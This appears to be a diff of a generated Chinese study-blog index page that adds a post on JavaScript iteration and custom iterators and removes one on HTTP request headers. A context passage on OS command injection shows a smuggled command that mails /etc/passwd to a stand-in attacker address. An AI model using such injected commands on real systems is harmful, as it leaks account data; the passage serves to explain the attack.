@@ -182,6 +182,80 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://coloey.github.io/2022/04/13/%E9%81%8D%E5%8E%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic3.zhimg.com/80/v2-93091834844364ab73fd617db4685210_720w.jpg?source=1940ef5c">
+      <meta itemprop="name" content="小柒">
+      <meta itemprop="description" content="欢迎来到我的世界!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小柒">
+    </span>
+      <header class="post-header">
+
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/13/%E9%81%8D%E5%8E%86/" class="post-title-link" itemprop="url">遍历</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-04-13 17:33:34 / 修改时间：17:56:49" itemprop="dateCreated datePublished" datetime="2022-04-13T17:33:34+08:00">2022-04-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JavaScript/" itemprop="url" rel="index"><span itemprop="name">JavaScript</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>for…in 用来遍历对象的可枚举属性列表</p>
+<p>forEach(…)用来遍历数组中的所有普值并忽略回调函数的返回值</p>
+<p>for…of直接遍历值，会首先向被访问对象请求一个迭代器对象，然后通过调用迭代器对象的next()方法来遍历所有返回值</p>
+<p>自定义对象迭代器</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myObject=&#123;</span><br><span class="line">      <span class="attr">a</span>:<span class="number">2</span>,</span><br><span class="line">      <span class="attr">b</span>:<span class="number">3</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(myObject,<span class="built_in">Symbol</span>.iterator,&#123;</span><br><span class="line">      <span class="attr">enumerable</span>:<span class="literal">false</span>,</span><br><span class="line">      <span class="attr">writable</span>:<span class="literal">false</span>,</span><br><span class="line">      <span class="attr">configurable</span>:<span class="literal">true</span>,</span><br><span class="line">      <span class="attr">value</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">var</span> o=<span class="built_in">this</span>;</span><br><span class="line">          <span class="keyword">var</span> idx=<span class="number">0</span>;</span><br><span class="line">          <span class="keyword">var</span> ks=<span class="built_in">Object</span>.keys(o);<span class="comment">//获取Object对象所有键值</span></span><br><span class="line">          <span class="keyword">return</span>&#123;</span><br><span class="line">              <span class="attr">next</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">//next是一个函数</span></span><br><span class="line">                  <span class="keyword">return</span>&#123;</span><br><span class="line">                      <span class="attr">value</span>:o[ks[idx++]],</span><br><span class="line">                      <span class="attr">done</span>:(idx&gt;ks.length)</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">var</span> it=myObject[<span class="built_in">Symbol</span>.iterator]();</span><br><span class="line">  it.next();</span><br><span class="line">  it.next();</span><br><span class="line">  it.next();</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> v <span class="keyword">of</span> myObject)&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(v);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://coloey.github.io/2022/04/13/Object/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -960,7 +1034,7 @@
 <p>程序接收到该值后构成以下组合：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(MAIL,&quot;| /usr/sbin/sendmail;cat /etc/passwd | mail hack@example.jp</span><br></pre></td></tr></table></figure>
 
-<p>“;”在OS命令中会被解析为分割多个执行命令的标记，因此sendmail会将含有Linux账户信息/etc/passwd的文件以邮件形式发送给<a href="mailto:&#104;&#97;&#x63;&#x6b;&#64;&#x65;&#x78;&#97;&#x6d;&#x70;&#108;&#x65;&#x2e;&#106;&#x70;">&#104;&#97;&#x63;&#x6b;&#64;&#x65;&#x78;&#97;&#x6d;&#x70;&#108;&#x65;&#x2e;&#106;&#x70;</a>。</p>
+<p>“;”在OS命令中会被解析为分割多个执行命令的标记，因此sendmail会将含有Linux账户信息/etc/passwd的文件以邮件形式发送给<a href="mailto:&#104;&#x61;&#x63;&#107;&#64;&#101;&#120;&#x61;&#x6d;&#112;&#108;&#101;&#46;&#106;&#112;">&#104;&#x61;&#x63;&#107;&#64;&#101;&#120;&#x61;&#x6d;&#112;&#108;&#101;&#46;&#106;&#112;</a>。</p>
 <h2 id="HTTP首部注入攻击"><a href="#HTTP首部注入攻击" class="headerlink" title="HTTP首部注入攻击"></a>HTTP首部注入攻击</h2><p>值攻击者通过在响应首部字段内插入换行，添加任意响应首部或主题的一种攻击，属于被动攻击模式。向首部主题内添加内容的攻击称为HTTP响应阶段攻击。</p>
 <p>HTTP首部注入攻击有可能会造成以下影响：</p>
 <ul>
@@ -1235,132 +1309,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://coloey.github.io/2022/04/11/http%E8%AF%B7%E6%B1%82%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://pic3.zhimg.com/80/v2-93091834844364ab73fd617db4685210_720w.jpg?source=1940ef5c">
-      <meta itemprop="name" content="小柒">
-      <meta itemprop="description" content="欢迎来到我的世界!">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小柒">
-    </span>
-      <header class="post-header">
-
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/11/http%E8%AF%B7%E6%B1%82%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5/" class="post-title-link" itemprop="url">http请求首部字段</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-04-11 19:53:59" itemprop="dateCreated datePublished" datetime="2022-04-11T19:53:59+08:00">2022-04-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-20 13:44:58" itemprop="dateModified" datetime="2022-04-20T13:44:58+08:00">2022-04-20</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/http/" itemprop="url" rel="index"><span itemprop="name">http</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Accept"><a href="#Accept" class="headerlink" title="Accept"></a>Accept</h1><blockquote>
-<p>Accept:text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8</p>
-</blockquote>
-<p>Accept首部字段通知服务器，用户代理能够处理的媒体类型及媒体类型的相对优先级。可用type/subtype这种形式，一次指定多种媒体类型。</p>
-<p>文本文件：text/html,text/plain,text/css…</p>
-<p>application/xhtml+xml,application/xml…</p>
-<p>图片文件：image/jpg,image/gif…</p>
-<p>视频文件：video/mpeg,video/quicktime…</p>
-<p>应用程序使用的二进制文件：application/octet-stream,application/zip…</p>
-<p>若想给显示的媒体类型增加优先级，使用q=来额外表示权重值，用分号（；）进行分隔，权重值q范围是0~1,（可精确到小数点后3位，且1为最大值。不指定权重值q时，默认权重为q=1.0</p>
-<p>当服务器提供多种内容时，将首先返回权重值最高的媒体类型。</p>
-<h1 id="Accept-Charset"><a href="#Accept-Charset" class="headerlink" title="Accept-Charset"></a>Accept-Charset</h1><blockquote>
-<p>Accept-Charset:iso-8859-5,unicode-1-1;q=0.8</p>
-</blockquote>
-<p>Accept-Charset首部字段可用来通知服务器用户代理支持的字符集及字符集的相对优先顺序。另外，可一次性指定多种字符集。与各首部字段Accept相同的是可用权重q值来表示相对优先级</p>
-<p>该首部字段用于内容协商机制的服务器驱动协商。</p>
-<h1 id="Accept-Encoding"><a href="#Accept-Encoding" class="headerlink" title="Accept-Encoding"></a>Accept-Encoding</h1><blockquote>
-<p>Accept-Encoding:gzip,deflate</p>
-</blockquote>
-<p>Accept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。可一次性指定多种内容编码。</p>
-<p>gzip:由文件压缩程序gzip（GNU zip)生成的编码格式，采用LZ77及32为循环冗余校验</p>
-<p>compress:由UNIX文件压缩程序compress生成的编码格式，采用的算法LZW</p>
-<p>deflate:组合使用zlib格式及由deflate压缩算法生成的编码格式</p>
-<p>identity:不执行压缩或不会变化的默认编码格式</p>
-<p>采用权值q来表示相对优先级，这点与首部字段Accept相同。可用(*)作为通配符，指定任意编码格式</p>
-<h1 id="Accept-Language"><a href="#Accept-Language" class="headerlink" title="Accept-Language"></a>Accept-Language</h1><p>告知服务器用户代理能够处理的自然语言集，以及自然语言集的相对优先级。可一次指定多种自然语言集</p>
-<p>按权重q表示相对优先级。</p>
-<h1 id="Authorization"><a href="#Authorization" class="headerlink" title="Authorization"></a>Authorization</h1><p>首部字段Authorization用来告知服务器，用户代理的认证信息，通常想要通过服务器认证的用户代理会在接收待返回的401状态码后，把首部字段Authorization加入到请求中。共用缓存在接收到含有Authorization首部字段的请求时的操作处理会略有差异。</p>
-<h1 id="Expect"><a href="#Expect" class="headerlink" title="Expect"></a>Expect</h1><blockquote>
-<p>Expect:100-continue</p>
-</blockquote>
-<p>客户端使用首部字段Expect来告知服务器，期望出现的某种特定行为，因服务器无法理解客户端的期望做出回应而发生错误时，会返回417Expectation Failed</p>
-<p>客户端可以利用该首部字段，写明所期望的扩展。虽然HTTP/1.1规范只定义100-continue(状态码100Continue之意)</p>
-<h1 id="From"><a href="#From" class="headerlink" title="From"></a>From</h1><p>首部字段From用来告知服务器使用用户代理的用户的电子邮件地址。通常使用目的是为了显示搜索引擎用户代理的负责人的电子邮件联系方式。使用代理时，尽可能包含From首部字段</p>
-<h1 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h1><p>首部字段Host会告知服务器，请求的资源所处的互联网主机名和端口号。Host首部字段再HTTP/1.1规范内是唯一一个必须被包含在请求内的首部字段。</p>
-<p>请求被发送到服务器时，请求中的主机名会用IP地址直接替换解决，但如果这时相同的IP地址下部署运行着多个域名，那么服务器就无法理解是哪个域名对应的请求。因此，就要使用首部字段Host来明确指出请求的主机名，若服务器未设定主机名，那直接发送空值。</p>
-<p>Host:</p>
-<h1 id="If-Match"><a href="#If-Match" class="headerlink" title="If-Match"></a>If-Match</h1><p>if-xxx为条件请求，服务器接收到附带条件请求后，只有判断指定条件为真，才执行请求。</p>
-<p>首部字段If-Match，属于附带条件之一，它会告知服务器匹配资源所用的实体标记(ETag)值，这时的服务器无法使用弱ETag值，服务器对比If-Match的字段值与资源的ETag值，仅当两者一致时才执行请求，否则，返回状态码412 Precondition Failed</p>
-<p>还可以使用(*)指定If-Match的字段值，针对这种情况，服务器会忽略ETag的值，只要资源存在就处理请求。</p>
-<h1 id="If-Modified-Since"><a href="#If-Modified-Since" class="headerlink" title="If-Modified-Since"></a>If-Modified-Since</h1><blockquote>
-<p>If-Modified-Since: Thu,15 Apr 2004 00:00:00 GMT</p>
-</blockquote>
-<p>首部字段If-Modified-Since属于附带条件之一，它会告知服务器若If-Modified-Since字段值早于资源的更新时间，则希望能处理该请求，而在If-Modified-Since字段值的日期时间后，如果请求的资源都没有更新，返回状态码304Not Modified的响应</p>
-<p>If-Modified-Since用于确认代理或客户端拥有的本地资源的有效性，获取资源的更新时间可通过确认首部字段Last-Modified确定</p>
-<h1 id="If-None-Match"><a href="#If-None-Match" class="headerlink" title="If-None-Match"></a>If-None-Match</h1><p>与If-Match作用相反，用于指定If-None-Match字段值的实体标记（ETag)值与请求资源得到ETag不一致时会告知服务器处理该请求。</p>
-<p>在GET或HEAD方法中使用首部字段If-None-Match可获取最新的源，因此这与使用首部字段If-Modified-Since有些类似。</p>
-<h1 id="If-Range"><a href="#If-Range" class="headerlink" title="If-Range"></a>If-Range</h1><p>If-Range字段值若是和ETag值或更新的日期时间匹配一致，那么就作为范围请求处理，<strong>若不一致返回全部资源</strong></p>
-<p>如果不使用If-Range,而是使用If-Match,服务器端的资源如果更新了，那客户端持有的资源中的一部分也会随之无效，服务器端就会以<strong>402 Precondition Failed</strong>返回，催促客户端再次发请求，与使用If-Range相比，就要花费两倍的功夫。</p>
-<h1 id="If-Unmodified-Since"><a href="#If-Unmodified-Since" class="headerlink" title="If-Unmodified-Since"></a>If-Unmodified-Since</h1><p>与If-Modified-Since作用相反，它的作用是告知服务器，指定的资源只有在字段值内指定的日期时间之后未发生更新得情况下，才能处理请求，如果在指定日期时间后发生了更新，则以状态码412 Precondition Failed作为响应返回</p>
-<h1 id="Max-Forwards"><a href="#Max-Forwards" class="headerlink" title="Max-Forwards"></a>Max-Forwards</h1><p>通过TRACE方法或OPTIONS方法，发送包含首部字段Max-Forwards的请求时，该字段以十进制整数的形式指定可经过的服务器最大数目。服务器在往下一个服务器转发请求前，Max-Forwards的值减1后重新复制，当服务器收到Max-Forwards值为0的请求时则不再进行转发，而是直接返回响应。</p>
-<p>如果代理服务器由于某些原因导致请求转发失败，客户端也就等不到服务器返回的响应。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1432,14 +1380,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">109</span>
+          <span class="site-state-item-count">110</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">17</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -1493,7 +1441,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共198.8k字</span>
+  <span class="post-count">博客全站共253.9k字</span>
 </div>
         
 
